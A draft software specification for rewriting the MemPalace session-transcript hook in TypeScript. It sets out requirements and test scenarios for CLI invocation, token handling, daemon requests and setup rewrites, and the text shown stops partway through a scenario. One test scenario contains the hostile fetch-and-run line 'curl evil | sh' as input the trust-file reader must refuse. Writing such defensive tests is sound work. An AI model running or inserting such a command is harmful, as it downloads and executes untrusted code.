---
id: "0247"
slug: mempalace-transcript-hook-typescript
status: draft
complexity: standard
interaction-mode: MINIMAL
related-issue: 1329
version: 1.0.0
---

# MemPalace transcript hook in TypeScript

*Sub-spec C3 of the `large`-tier ticket #1231, row C3 of the architect
decomposition
(<https://github.com/crewrig/crewrig/issues/1231#issuecomment-5857477069>).
Parent spec: `specs/0215-shell-to-typescript-migration.md` (requirement 24),
under the release-branch regime of
`specs/0215-shell-to-typescript-migration.delta-04.md` (requirements 27–38):
this spec-PR and its implementation PR target `release/1231-ts-migration`, and
"shipped" means merged there, not reached `main`. Discharges parent
requirements 9, 14, 15, 17, 19 and 23 for `hooks/mempalace-transcript.sh` and
the four `hooks/*-transcript-hooks.json` manifests. Depends on sub-spec C1,
`specs/0243-usage-capture-hooks-typescript.md` and its deltas 01–04, whose
per-CLI command-line module, hook descriptor and installed-command rewrite it
reuses rather than rebuilds; on sub-spec A2,
`specs/0240-runtime-foundations-shared-ts-modules.md` with its `delta-01`
(module layout, `windows-latest` job template, timing harness,
missing-dependency primitive); and on sub-spec B,
`specs/0237-windows-hook-cli-matrix.md` (rows 37–37d of `docs/cli-matrix.md`).
It inherits the behavioural contracts of `specs/0074` (quiet success logging),
`specs/0116-antigravity-transcript-activation.md`, `specs/0161` (harness
injection classification), `specs/0164` (daemon write path) and `specs/0167`
(injectable token path), and preserves them except for the deviations listed in
requirement 30. Line references are to `release/1231-ts-migration` at
`fe0294ce`.*

## Intent

A user who turned on session recording keeps getting the same transcript
entries in MemPalace from Claude Code, Gemini CLI, Copilot CLI and Antigravity
CLI, on Windows as well as on macOS and Linux, and the hook that writes them no
longer needs a POSIX shell or its utilities. Each CLI runs a command line its own
interpreter on Windows can parse, and no command line carries an environment
assignment that interpreter cannot read. A hook firing that records nothing
costs a stated, small amount of time. The hook never fails the user's turn,
never shows the user's prompt or the daemon credential on a process argument
list, and on Antigravity CLI always answers with an empty JSON object. A
machine that already records sessions is brought to the new form the next time
the user runs setup, exactly as a machine with usage capture is, without
touching any hook the user or another part of the framework owns.

## Requirements

1. **TypeScript entry point.** `hooks/mempalace-transcript.ts` SHALL replace
   the behaviour of `hooks/mempalace-transcript.sh`, runnable as a direct
   `node` command line with no dispatcher and no intermediate CrewRig entry
   point (parent requirements 1 and 15), at the path of its shell predecessor
   with `.sh` changed to `.ts` (parent requirement 9, spec 0240
   requirement 11), and written to the TypeScript conventions of parent
   requirement 2. Its entry file SHALL take the form spec 0243 requirement 5
   fixes for a hook entry (no module syntax, the process's `warning` listeners
   removed before anything else is loaded), so that no warning Node.js prints
   reaches standard output or standard error on any Node.js 24 release, with
   no flag and no environment variable on the command line. Every other module
   the hook loads SHALL live under `scripts/lib/` (spec 0240 requirement 11).

2. **Forwarding shim.** `hooks/mempalace-transcript.sh` SHALL remain, reduced
   to a forwarding shim that only invokes the TypeScript entry point with the
   arguments and standard input it received, and SHALL stay on the ratchet
   allowlist without adding an entry (parent requirements 9 and 10). When
   `node` is missing from the search path the shim SHALL write the single line
   `mempalace-transcript: node required` to standard error and exit zero — the
   treatment the shell gives a missing `jq` or `curl`
   (`hooks/mempalace-transcript.sh:88-89`) — and, when invoked with an
   Antigravity argument shape (requirement 3), SHALL still write the
   acknowledgement of requirement 5.

3. **Invocation shapes.** The hook SHALL accept exactly these argument shapes:
   (a) no argument — the legacy form the Claude Code, Gemini CLI and Copilot
   CLI registrations use today (`hooks/claude-transcript-hooks.json`,
   `hooks/gemini-transcript-hooks.json`, `hooks/copilot-transcript-hooks.json`);
   (b) one argument that is not a CLI identifier of item (c) — the legacy
   Antigravity form, the argument being the lifecycle event name
   (`hooks/mempalace-transcript.sh:47`); (c) the direct form, whose first
   argument is the CLI identifier `claude-code`, `gemini-cli` or `copilot-cli`
   with no further argument, or `antigravity-cli` followed by exactly one event
   name. The hook is in **Antigravity mode** in shape (b) and in shape (c) with
   `antigravity-cli`, and the event argument then plays the role `$1` plays in
   the shell (`hooks/mempalace-transcript.sh:42-57`). Any other shape SHALL end
   the run under requirement 6 with one line on standard error naming the
   accepted shapes and no request sent.

4. **Enablement.** In shapes (a) and (b) the hook SHALL record only when
   `MEMPALACE_TRANSCRIPT_ENABLED` equals `1`, as today
   (`hooks/mempalace-transcript.sh:75-78`). In shape (c) the registration
   itself is the user's consent, because setup writes the direct form only
   after the opt-in, and no direct form can carry an environment assignment on
   Windows (row 37c of `docs/cli-matrix.md`, `CommandNotFoundException`): the
   hook SHALL record unless `MEMPALACE_TRANSCRIPT_ENABLED` is set to a
   non-empty value other than `1`, which keeps that variable usable as a
   kill-switch (decision Q1). A disabled run SHALL exit zero,
   write nothing to standard error, send no request, spawn no process and need
   not read its standard input.

5. **Antigravity acknowledgement.** In Antigravity mode the hook SHALL write
   exactly `{}` followed by one line feed to standard output on every path —
   disabled, malformed payload, nothing to record, a failed persistence, the
   missing-dependency path of requirement 18 — and nothing else to standard
   output (spec 0116 requirement 10, `hooks/mempalace-transcript.sh:49-73`).
   Outside Antigravity mode it SHALL write nothing to standard output (spec
   0116 requirement 11).

6. **Exit status.** The hook SHALL exit with status zero on every path except
   the one of requirement 18, as its own header states it does
   (`hooks/mempalace-transcript.sh:32-34`). This includes a payload that is
   not JSON and a transcript whose last lines do not all parse, which the shell
   ends with `jq`'s status 5 under `set -euo pipefail`
   (`hooks/mempalace-transcript.sh:40`, `:99`, `:206`; reproduced on the
   release branch) — a deviation of requirement 30.

7. **Cheap guard before any work (parent requirement 15).** Using the Node.js
   standard library alone, and before it loads the module graph that builds
   and sends a record, the entry module SHALL decide the argument shape and the
   enablement of requirement 4, read the whole payload, parse it, and exit when
   the payload's `hook_event_name` is `PostToolUse`
   (`hooks/mempalace-transcript.sh:134-139`) — with no request sent and no
   process spawned. It SHALL load the rest of its module graph through a lazy
   `import()` only otherwise. A payload that does not parse as a JSON object
   SHALL end the run with nothing recorded and nothing written to standard
   error.

8. **Reading payload fields.** Wherever the shell reads a field with a `jq`
   alternative chain (`.a // .b // empty`), the hook SHALL select the first
   candidate whose value is neither absent, `null` nor `false`, as `jq`'s `//`
   does, and SHALL then use it when it is a non-empty string, or a number
   rendered in its JSON decimal form; any other selected value (an empty
   string, an object, an array, `true`) SHALL count as absent. Where the shell
   also tests the text against the literal `null`
   (`hooks/mempalace-transcript.sh:182`, `:193`, `:224`, `:236`), the hook
   SHALL do the same.

9. **Session, project and room.** The hook SHALL derive, exactly as
   `hooks/mempalace-transcript.sh:94-126` does: the session identifier — in
   Antigravity mode `conversationId`, otherwise the first non-empty of
   `GEMINI_SESSION_ID`, `CLAUDE_SESSION_ID`, `COPILOT_SESSION_ID`, the payload's
   `session_id // sessionId`, then `unknown`; the project directory — in
   Antigravity mode `workspacePaths[0]`, otherwise the first non-empty of
   `GEMINI_PROJECT_DIR`, `CLAUDE_PROJECT_DIR`, `COPILOT_PROJECT_DIR`, the
   payload's `workspace_dir // workspace // project_dir // projectDir // cwd`,
   then in both modes the top level of the Git repository containing the
   hook's working directory, then that working directory; the project name as
   the last component of that directory, read with both separators on
   Windows; and the room as `<project name>-<local date YYYY-MM-DD>-<first 8
   characters of the session identifier>`. The Git top level SHALL be obtained
   from Git itself (issue #92), which parent requirement 23 permits.

10. **Classification.** The event SHALL be the payload's `hook_event_name`,
    else the Antigravity event argument (`hooks/mempalace-transcript.sh:129-132`).
    The hook SHALL build at most one entry, with the entry type and content
    template of `hooks/mempalace-transcript.sh:161-240` and the same
    precedence, including its two unguarded overrides: a non-empty `prompt`
    replaces an Antigravity entry (`:180-190`), and a `SessionStart` or
    `SessionEnd` event replaces any entry (`:215-220`). The harness-injection
    test SHALL accept and reject the same texts as `_is_harness_injection`
    (`:148-159`): its nine literal substrings, and its extended regular
    expression applied to each line. When no entry results, the run SHALL end
    with nothing sent and nothing written to standard error. Model responses
    SHALL be cut to their first 2000 characters (`:239`).

11. **Stop summary.** For a `Stop` entry, when `transcript_path //
    transcriptPath` names an existing file, the summary SHALL be built as
    `hooks/mempalace-transcript.sh:205-207` builds it: from the last 20 lines of
    the file, the records whose `type` is `PLANNER_RESPONSE`,
    `ASSISTANT_RESPONSE` or `RESPONSE`; from each, `content`, else each
    `tool_calls[].name`; the last 5 resulting lines, each followed by one space;
    at most the first 500 bytes. A line that does not parse as JSON, and a
    selected value that is not a string, SHALL be skipped. The run SHALL stay
    within the budget of requirement 19(c) for a 50 MB transcript.

12. **Content bound.** The content sent SHALL be at most 4000 bytes of UTF-8
    (`hooks/mempalace-transcript.sh:246`), and every cut this spec states in
    bytes — this one and the 500 bytes of requirement 11 — SHALL fall on a
    character boundary, never inside a multi-byte character.

13. **One request to the shared daemon.** The hook SHALL send one JSON-RPC 2.0
    `tools/call` request with `id` 1 for `mempalace_add_drawer` with the
    arguments `wing: "transcripts"`, the room, the content and
    `added_by: "transcript-hook"` (`hooks/mempalace-transcript.sh:286-303`), as
    an HTTP `POST` to `http://<host>:<port>/mcp` with a JSON content type and a
    bearer `Authorization` header, bounded to 5 seconds for the whole exchange
    (`:322`, issue #90). Host and port SHALL be `MEMPALACE_MCP_HOST` and
    `MEMPALACE_MCP_PORT`, defaulting to `127.0.0.1` and `41893`, read through
    the one definition the framework already has for them, so the hook and
    `scripts/lib/common.sh` (`MCP_DAEMON_HOST_DEFAULT`, `:1113`;
    `MCP_DAEMON_PORT_DEFAULT`, `:1119`; `mcp_daemon_url`, `:1502-1506`) cannot
    drift: `endpoint()` of `scripts/lib/usage-store/mcp.js`, typed by
    `scripts/lib/usage-store/mcp.d.ts` (decision Q3). The hook SHALL send its
    own request, and SHALL NOT use that module's `call()`. Neither the token
    nor the content SHALL appear on the argument list of any process.

14. **Token.** The bearer token SHALL be read from the first of: the file named
    by `MEMPALACE_DAEMON_TOKEN_FILE` (spec 0167); the file named by
    `TOKEN_PATH_MOCK` (`hooks/mempalace-transcript.sh:265`); the token path of
    `mcp_token_path` (`scripts/lib/common.sh:2053-2071`) — the palace path from
    `MEMPALACE_PALACE_PATH` or `<home>/.mempalace/palace`, resolved to its
    physical path, its SHA-256 hex digest cut to 24 characters, under
    `<home>/.mempalace/server/` — through the same single definition as
    requirement 13 — `tokenPath()` of `scripts/lib/usage-store/mcp.js`, in a
    variant that creates no directory, since `tokenPath()` creates the palace's
    parent (`scripts/lib/usage-store/mcp.js:110`), and that the existing
    function and the variant share (decision Q3); and, when that file does not exist, the first
    `<home>/.mempalace/server/*/token` in byte order of the directory name
    (`hooks/mempalace-transcript.sh:270-275`). Its content SHALL have every
    whitespace character removed (`:282`). A token file that is absent SHALL
    give `DAEMON_UNREACHABLE: token file not found at <path>` (`:278-281`) and
    one that is empty after removal SHALL give a `DAEMON_UNREACHABLE` line saying
    so, both as status 4 of requirement 15. Resolving the token SHALL create no
    file and no directory.

15. **Outcome and logging.** The hook SHALL classify the outcome as
    `hooks/mempalace-transcript.sh:242-359` does, with the same status codes:
    (a) a 2xx response whose body parses as JSON, carries no `error.message`
    and no `result.isError` equal to `true` — success, and, unless
    `MEMPALACE_TRANSCRIPT_QUIET` equals `1`, the line
    `mempalace-transcript: persisted <entry type> to transcripts/<room>`
    (spec 0074); (b) an `error.message` — `ADD_FAILED: <message>`, status 3;
    (c) `result.isError` equal to `true` — `ADD_FAILED: <result.content[0].text>`,
    status 3; (d) a token failure of requirement 14, a connection failure, the
    5-second bound, a non-2xx status or a body that is not JSON —
    `DAEMON_UNREACHABLE: <host>:<port> — <reason>`, status 4. On (b) to (d) the
    hook SHALL write the diagnostic line, then
    `mempalace-transcript: FAILED to persist <entry type> (rc=<status>):` and one space,
    whatever `MEMPALACE_TRANSCRIPT_QUIET` says (spec 0074 requirement 3). All of
    these lines go to standard error, and the status is the one inside the
    `rc=` field, never the process exit status (requirement 6).

16. **Trust file reader.** A module `scripts/lib/tls-env.ts` SHALL read
    `<home>/.crewrig/tls-env.sh` without executing it and without spawning a
    shell, and SHALL accept exactly the format
    `scripts/lib/tls-delegation.sh:116-130` writes: comment lines starting with
    `#`, blank lines, and lines `export NAME=VALUE` where `NAME` matches
    `[A-Za-z_][A-Za-z0-9_]*` and `VALUE` is a value Bash's `printf %q` produces
    (a word with backslash escapes, a `$'…'` string, or `''`), with LF or CRLF
    line endings (parent requirement 22). An absent file SHALL yield nothing. A
    file with any other line SHALL yield nothing, and the hook SHALL write one
    line to standard error naming the file and the first such line number, then
    continue. The hook SHALL apply what the reader yields to the environment of
    every process it spawns, as the shell's `.` did
    (`hooks/mempalace-transcript.sh:80-85`); the hook's own request is plain
    HTTP to the daemon, so no value read changes it. This module is the
    cross-step contract with row F1 (#1335): F1 either keeps this format or
    replaces it, migrates the installed files on the next setup run (parent
    requirement 15) and changes this reader in the same pull request.
    (Decision Q4.)

17. **Standard library and Git only.** The hook SHALL import no third-party
    package (parent requirement 6, spec 0240 requirement 16) and SHALL spawn no
    process other than Git (parent requirement 23).

18. **Missing-dependency diagnostic.** Should a package a later change adds
    become unresolvable when the hook fires, and the failure reach the entry
    module as the `MissingDependencyError` of spec 0240 requirement 7, the hook
    SHALL write that diagnostic to standard error, still write the
    acknowledgement of requirement 5 in Antigravity mode, exit with status 1 and
    never status 2, and show no unhandled module-resolution error. While
    requirement 17 holds this path is unreachable. The change that makes it
    reachable SHALL carry, for every event this hook is wired to, the duties
    spec 0243 delta-04 requirement 38 places on the change that makes the
    usage-capture path reachable.

19. **Budgets (parent requirement 15).** Each budget is an upper bound on
    wall-clock time from process start to exit, Node.js start-up included,
    measured over 10 consecutive runs on `windows-latest` by the harness of
    spec 0240 requirement 13. Initial values, which the rule below may only
    lower: (a) direct form, `PostToolUse` payload: 750 ms; (b) shape (a) with
    `MEMPALACE_TRANSCRIPT_ENABLED` unset: 750 ms; (c) direct form, `Stop`
    payload naming a 50 MB transcript, persisted to a stub daemon on the
    loopback interface: 2000 ms; (d) direct form, `UserPromptSubmit` payload,
    nothing listening on the daemon port: 2000 ms. After the first green run
    of each job the implementation PR SHALL replace a budget with
    `max(3 x the largest observed run, 300 ms)` rounded up to the next 50 ms
    when that is lower, and SHALL state each budget in the workflow next to its
    script. A run that exceeds a budget SHALL fail its job, naming the script,
    the case, the budget and the measured time. A daemon that accepts the
    connection and never answers is bounded by requirement 13, not budgeted.

20. **Per-CLI command line.** The command line each CLI receives SHALL come
    from the shared module of spec 0243 requirement 16
    (`scripts/lib/hook-command.ts`) through a hook descriptor registered for
    this hook, in the forms that requirement and spec 0243 delta-03
    requirements 32 to 34 fix: `node "<abs>/hooks/mempalace-transcript.ts"
    <cli-id>` for Claude Code on every platform and for every CLI on macOS and
    Linux; the same text with the absolute path spelled out, no
    `NAME=value` prefix and, for Copilot CLI, under the `command` key, for
    Gemini CLI and Copilot CLI on Windows; and, for Antigravity CLI's hooks
    surface on Windows, the guarded form
    `set NoDefaultCurrentDirectoryInExePath=1&& node <abs>/hooks/mempalace-transcript.ts antigravity-cli Stop`
    with the path unquoted, produced only while the hooks entry of the
    measured-surface constant is in state (e) of spec 0243 delta-03
    requirement 32, as it is on the release branch
    (`scripts/lib/hook-command.ts:118-142`), and otherwise refused with that
    requirement's diagnostic and nothing written. A checkout path that spec
    0243 requirement 17 refuses for the target interpreter — whitespace among
    others for `cmd.exe` — SHALL be refused the same way, and the refusal
    recorded as a parity gap (requirement 33).

21. **Wired by in-repo absolute path.** Setup SHALL wire the hook by the
    absolute physical path of `hooks/mempalace-transcript.ts` in the checkout
    that runs setup, and SHALL NOT install any copy of it under a CLI's own
    directory, because parent requirement 3 runs every migrated script from
    inside a cloned repository. This supersedes, for this hook, the install
    step of `scripts/setup-claude-interactive.sh:465-467`,
    `scripts/setup-gemini-interactive.sh:418-420`,
    `scripts/setup-copilot-interactive.sh:409-411` and
    `scripts/lib/common.sh:2369-2371`, and spec 0116 requirement 13 and spec
    0169 requirement 1 (see *Open questions*). The disclosure before enabling
    SHALL say that recording depends on the checkout staying at that path and
    that re-running setup repairs it, as row 8c of `docs/cli-matrix.md` says for
    usage capture, and setup SHALL warn when that checkout is a linked worktree,
    as it already does for the worktree git guard (`warn_if_linked_worktree`).

22. **Manifests.** The `crewrig-mempalace-transcript` entries of
    `hooks/antigravity-transcript-hooks.json` and the transcript entries of the
    three other `hooks/*-transcript-hooks.json` SHALL carry the direct form of
    requirement 20, with no environment assignment, keeping the path tokens they
    carry today (`$CLAUDE_PROJECT_DIR`, `${GEMINI_PROJECT_DIR}`,
    `${COPILOT_PROJECT_DIR:-$PWD}`, the relative `hooks/` of Antigravity CLI),
    which setup always replaces with the absolute path, so no installed command
    line carries a token row 37c records as unusable. Events, selectors, entry
    names and the Antigravity `timeout` SHALL be unchanged. The worktree git
    guard entries in the same files belong to row C2 (#1328) and SHALL be left
    byte-identical.

23. **Rewrite on the next setup run.** On every run of the four
    `scripts/setup-*-interactive.sh` with Node.js at or above the floor
    (requirement 27): when the user enables session recording, setup SHALL
    deploy the direct form with the merge semantics it uses today
    (`merge_session_recording_hooks`; `deploy_antigravity_transcript_hooks`,
    `scripts/lib/common.sh:2356`); when the user declines or cancels and the
    CLI's configuration already holds a recognised transcript command
    (requirement 24), setup SHALL rewrite each such command in place to the
    direct form, keeping its event, selector, key order, every other key and
    every other entry exactly as they were. Setup SHALL report, by name and
    count, the commands it wrote or rewrote and those it left, with the reason.

24. **Recognition by content.** A registered command is a transcript command
    when its whole shape matches: an optional prefix made only of
    `MEMPALACE_TRANSCRIPT_ENABLED=1`, optionally followed by one
    `MEMPALACE_PYTHON=<non-blank word>` — the prefix setup writes today
    (`scripts/setup-gemini-interactive.sh:421-424`,
    `scripts/setup-copilot-interactive.sh:413-416`,
    `scripts/setup-antigravity-interactive.sh:452-455`) — an optional `env`, an
    optional `bash`, `sh` or `node`, a script path ending in
    `/mempalace-transcript.sh` or `/mempalace-transcript.ts`, quoted or not, and
    the arguments of one shape of requirement 3; and, for the Antigravity CLI
    descriptor only, the guarded prefix of spec 0243 delta-03 requirement 34.
    The predicate `sr_is_own` (`scripts/lib/usage-capture-optin.sh:206-213`)
    and the TypeScript recogniser SHALL accept and reject the same commands,
    proven by the shared corpus
    `scripts/tests/fixtures/usage-capture/recognition-corpus.json` run through
    both. A command that chains an operator's own script, or names a script
    called `mempalace-transcript.*` with other arguments, SHALL never be
    rewritten, kept, deduplicated or removed.

25. **Target and left commands.** Setup SHALL rewrite a recognised transcript
    command to the `.ts` of the checkout running setup, whatever path the
    command names, because the legacy paths name copies setup made from
    whichever checkout ran it last (`scripts/lib/common.sh:2369`). It SHALL
    leave unchanged, and report with the reason, a recognised command whose
    prefix carries any assignment other than those of requirement 24, so that
    an operator's own setting is never dropped silently (as spec 0243 delta-01
    does for capture commands). It SHALL leave the installed copies under the
    CLIs' directories on disk and report their paths as no longer used.

26. **Idempotence and write safety.** A second run over a rewritten
    configuration SHALL write nothing and create no backup. No combination of
    the session-recording question and the usage-capture question SHALL leave
    two transcript commands on one event of one CLI. Every write SHALL be
    backup-first, end at mode 0600, preserve every entry and key it does not
    own, refuse a configuration that is not a JSON object, leave the file
    byte-identical when it fails, and put no configuration content on the
    argument list of any process (spec 0243 requirement 23).

27. **Floor precondition.** When the `node` setup finds runs a major version
    below 24, setup SHALL run the floor guard of spec 0240 requirement 1, print
    its diagnostic, write no transcript command in the direct form, enable
    nothing new, and leave every installed transcript command as it is.

28. **Reused mechanism.** The wiring SHALL go through the descriptor,
    recognition, rewrite and Antigravity hooks modules C1 built
    (`scripts/lib/hook-descriptor.ts`, `hook-recognition.ts`, `hook-rewrite.ts`,
    `hook-antigravity.ts`, `scripts/hook-wiring.ts`), reached from the Bash
    setups through `node`, spawning no POSIX-only utility. Where the descriptor
    cannot yet express what requirements 3, 24 and 25 need, the implementation
    PR SHALL extend it only by optional fields whose absence leaves every
    existing descriptor's behaviour unchanged, proven by C1's tests passing
    unchanged.

29. **Wiring confined to this hook.** This spec SHALL change no usage-capture
    command, no status-line command and no worktree git guard command, and the
    rewrite of requirement 23 SHALL touch only commands requirement 24
    recognises.

30. **Deviations from the shell behaviour (parent requirement 14).** The
    observable contract SHALL be preserved except for exactly these: the
    command line each CLI runs and where it points (requirements 20 to 22); the
    enablement of the direct form (requirement 4); exit status zero where `jq`
    ended the shell with status 5, and the record that a transcript with an
    unparsable line now gets (requirements 6 and 11); selected payload values
    that are not strings or numbers counted as absent (requirement 8); cuts on
    character boundaries (requirement 12); the content no longer on a process
    argument list (requirement 13); the token key computed over the physical
    palace path from `MEMPALACE_PALACE_PATH`, where the shell hashed the
    unresolved `MEMPALACE_PATH` (`hooks/mempalace-transcript.sh:256-268`), and an
    empty token refused instead of sent (requirement 14); a non-2xx or non-JSON
    response counted as a failure where the shell counted it as persisted, and
    the reason in the `DAEMON_UNREACHABLE` line in place of `curl`'s exit code
    and standard error (requirement 15); a malformed trust file reported
    instead of executed (requirement 16); the project name read with both
    separators on Windows (requirement 9); and the exit status 1 of
    requirement 18.

31. **`windows-latest` proof (parent requirement 17).** The implementation PR
    SHALL add jobs, copied from the template of spec 0240 requirement 12 and
    recorded in `ci/ci-capabilities.yml` as `portability: specific` (spec 0240
    requirement 15), that from a non-POSIX interpreter (a) invoke
    `hooks/mempalace-transcript.ts` against a stub daemon on the loopback
    interface and assert the request's room and content, the bearer header,
    the standard-error lines of requirement 15 and, in Antigravity mode, the
    standard output of requirement 5; (b) run the command line requirement 20
    produces for each CLI through the invocation row 37 records for it —
    `bash -c` for Claude Code, `powershell.exe -NoProfile -NonInteractive
    -Command` for Gemini CLI and Copilot CLI, `cmd /c` with the wrapping row
    37f records for Antigravity CLI's hooks surface — and assert the hook ran;
    and (c) enforce the budgets of requirement 19.

32. **Oracle (parent requirement 13).** `scripts/tests/test-mempalace-transcript-hook.sh`
    observes the hook through a `curl` placed first on the search path
    (`scripts/tests/test-mempalace-transcript-hook.sh:62-88`, `:114-190`,
    `:192-259`, `:261-338`), which a TypeScript hook that spawns no `curl`
    (requirement 17) can never call. Before the
    implementation PR, a preparatory pull request of this ticket SHALL move
    that observation to a stub daemon on the loopback interface, keeping every
    case's input and expected outcome, and SHALL show the suite green against
    the unchanged shell hook; the implementation PR SHALL then run the suite
    against the TypeScript hook through the forwarding shim with its assertions
    unchanged. Its three assertions on the shell source text
    (`:51-59`, `:90-98`, `:100-112`) check a property only a shell file has and
    SHALL be removed in the implementation PR under the second exception of
    parent requirement 13, each replaced by a black-box TypeScript test of the
    behaviour it stood for (the 5-second bound, the Git top level in a linked
    worktree, diagnostics on standard error and not standard output). The suite
    SHALL NOT migrate to TypeScript in this ticket (row J1a, #1340), and no
    delta of spec 0215 is needed (decision Q2). The
    `scripts/tests/test-setup-*-transcript.sh` suites, `scripts/tests/test-setup-gemini-settings-merge.sh`,
    `scripts/tests/test-setup-usage-capture-optin.sh` and
    `scripts/tests/hook-antigravity.test.ts` SHALL pass with their assertions
    unchanged, except those whose expected value is a wired command text or the
    installed copy requirement 21 retires, which SHALL change to the new form
    and which the implementation PR SHALL list. New black-box TypeScript tests
    SHALL cover requirements 3 to 16 and 20 to 29.

33. **Parity (parent requirement 19).** The implementation PR SHALL record in
    `docs/cli-matrix.md`, in the same diff, every (CLI × operating system) cell
    where the hook cannot run, with evidence — at least Antigravity CLI on
    Windows from a checkout path that requirement 20 refuses.

34. **References updated in the same pull request (parent requirement 9).**
    Every page, workflow, capability entry and manifest that names the old
    invocation or the `jq`/`curl` write path SHALL be updated, at least rows 7g,
    8 and 8b of `docs/cli-matrix.md`, `docs/layers.md`, `docs/usage-capture.md`,
    `docs/scripting-conventions.md`, `docs/runbooks/chroma-http-server.md`,
    `docs/runbooks/custom-ca-tls-trust.md`, `README.md`,
    `ci/ci-capabilities.yml`, `scripts/probe-extension-hooks.sh` and, when a
    listed core path changes, `.crewrig/core-paths.txt`. Architecture decision
    records stay as written. The documentation SHALL state that the hook needs
    Node.js 24 or later when it fires.

## Scenarios

**Scenario:** A user prompt is recorded from the direct form

Given a stub daemon on the loopback interface, a token file at the path of
requirement 14, and a Claude Code `UserPromptSubmit` payload with the prompt
`Run the test suite`
When `node "<abs>/hooks/mempalace-transcript.ts" claude-code` runs with that
payload on standard input and `MEMPALACE_TRANSCRIPT_ENABLED` unset
Then the stub receives one `mempalace_add_drawer` call with wing `transcripts`,
content `[USER] Run the test suite` and a room
`<project>-<today>-<8 characters>`, standard output is empty, standard error
holds `mempalace-transcript: persisted user-prompt to transcripts/<room>`, and
the exit status is zero.

**Scenario:** A harness injection is classified apart

Given the same stub and a prompt starting with `<system-reminder>`
When the hook runs
Then the content starts with `[HARNESS] <system-reminder>` and the entry type
is `harness-injection`.

**Scenario:** A tool event costs almost nothing

Given a `PostToolUse` payload
When the direct form runs on `windows-latest`
Then no request reaches the stub, no process is spawned, nothing is written,
the exit status is zero, and the run stays within 750 ms over 10 runs.

**Scenario:** The legacy invocation stays gated on the variable

Given an argument-less invocation through `hooks/mempalace-transcript.sh` and
`MEMPALACE_TRANSCRIPT_ENABLED` unset
When a `Stop` payload is piped in
Then no request is sent, nothing is written to either stream, and the exit
status is zero; with the variable set to `1` the record is sent.

**Scenario:** The kill-switch still works on the direct form

Given the direct form and `MEMPALACE_TRANSCRIPT_ENABLED=0`
When a `Stop` payload is piped in
Then no request is sent and the exit status is zero.

**Scenario:** Antigravity CLI always gets an empty object

Given `antigravity-cli Stop` as arguments, then the legacy single argument
`Stop`, each with a payload carrying `conversationId`, `workspacePaths` and
`terminationReason`, and then with a payload that is not JSON, then with the
daemon down
When the hook runs
Then standard output is exactly `{}` and a line feed every time, the exit
status is zero every time, and the record sent when the daemon is up reads
`[AGENT] Session turn completed (<terminationReason>)` in a room named after
the workspace path and the conversation identifier.

**Scenario:** A malformed payload no longer fails the turn

Given a payload `not json` and an argument-less enabled invocation
When the hook runs
Then nothing is sent, nothing is written to either stream, and the exit
status is zero — where the shell hook exits 5.

**Scenario:** A transcript with a broken line still yields a record

Given a `Stop` payload whose transcript's last lines are a `RESPONSE` record
with content `hello` and a line `{bad`
When the hook runs
Then the content sent is `[AGENT] hello` (followed by its separating space)
and the exit status is zero — where the shell hook exits 5 and sends nothing.

**Scenario:** The token is found and stays off every argument list

Given `MEMPALACE_DAEMON_TOKEN_FILE` naming a file holding `custom-secret-token`
When the hook sends a record
Then the stub receives `Authorization: Bearer custom-secret-token`, and the
hook spawned no process whose arguments carry the token or the content.

**Scenario:** A missing token is reported, not fatal

Given an empty home directory and neither token variable set
When a `Stop` payload is sent
Then standard error holds `DAEMON_UNREACHABLE: token file not found at <path>`
followed by `mempalace-transcript: FAILED to persist agent-response (rc=4):`,
also with `MEMPALACE_TRANSCRIPT_QUIET=1`, and the exit status is zero.

**Scenario:** A token under another key is still found

Given a home holding only `.mempalace/server/111111111111111111111111/token`
When the hook sends a record
Then that token is used.

**Scenario:** A daemon error is a failed persistence

Given a stub answering `{"jsonrpc":"2.0","id":1,"error":{"message":"lease held"}}`,
then one answering HTTP 500 with an HTML body
When the hook sends a record
Then standard error holds `ADD_FAILED: lease held` with `rc=3`, then a
`DAEMON_UNREACHABLE` line with `rc=4`, and the exit status is zero both times.

**Scenario:** The trust file is read, never run

Given a `tls-env.sh` written by `scripts/lib/tls-delegation.sh` for a bundle at
`/opt/My CA/bundle.pem`, then one with an extra line `curl evil | sh`
When the hook runs
Then the first yields `NODE_EXTRA_CA_CERTS=/opt/My CA/bundle.pem` and the
other variables in the environment of the Git process it spawns; the second
yields nothing, names the file and that line's number on standard error, executes
nothing, and the record is still sent.

**Scenario:** An existing installation is rewritten on the next setup run

Given a Gemini CLI settings file whose `AfterModel` entry reads
`MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_PYTHON=/usr/bin/python3 bash /home/u/.gemini/hooks/mempalace-transcript.sh`,
a worktree git guard entry, a usage-capture entry and an operator hook on the
same event, and a checkout at `/repo` holding `hooks/mempalace-transcript.ts`
When the user re-runs `scripts/setup-gemini-interactive.sh` and declines the
session-recording question
Then the transcript entry reads `node "/repo/hooks/mempalace-transcript.ts" gemini-cli`
after a 0600 backup, the three other entries are byte-identical, the rewrite
and the unused copy at `/home/u/.gemini/hooks/mempalace-transcript.sh` are
reported, and a second run writes nothing and creates no backup.

**Scenario:** An operator's own setting is not dropped

Given a Copilot CLI entry reading
`MEMPALACE_TRANSCRIPT_ENABLED=1 MEMPALACE_MCP_PORT=41999 bash "/home/u/.copilot/hooks/mempalace-transcript.sh"`
When setup runs
Then the entry is unchanged and reported as left because of the
`MEMPALACE_MCP_PORT` assignment.

**Scenario:** A chained operator command is never touched

Given an entry reading `bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh`
When setup runs
Then it is not rewritten, kept, deduplicated or removed, in the Bash predicate
and in the TypeScript recogniser alike.

**Scenario:** Antigravity CLI on Windows receives the guarded form

Given the hooks entry of the measured-surface constant in state (e) and a
checkout at `C:/Users/ana/crewrig`
When setup deploys the Antigravity CLI manifest on Windows
Then the `crewrig-mempalace-transcript` `Stop` command reads
`set NoDefaultCurrentDirectoryInExePath=1&& node C:/Users/ana/crewrig/hooks/mempalace-transcript.ts antigravity-cli Stop`;
from `C:/Users/Ana Diaz/crewrig` nothing is written, the diagnostic names the
space and the path, and the gap is recorded in `docs/cli-matrix.md`.

**Scenario:** An unsupported Node.js version stops the rewrite

Given `node` reporting major version 20 and a legacy transcript command
installed
When the user runs setup and answers yes to session recording
Then setup prints the floor guard's diagnostic, writes no direct-form command,
and leaves the legacy command and its installed copy in place.

**Scenario:** Each CLI's command line launches on Windows

Given a `windows-latest` job with a stub daemon
When it runs the command line produced for each CLI through that CLI's
interpreter invocation of row 37
Then all four launch the hook and the stub receives a record, or the
Antigravity CLI hooks surface receives `{}` on standard output.

**Scenario:** A budget regression breaks the job

Given a change that makes the entry load its persistence modules before its
`PostToolUse` check
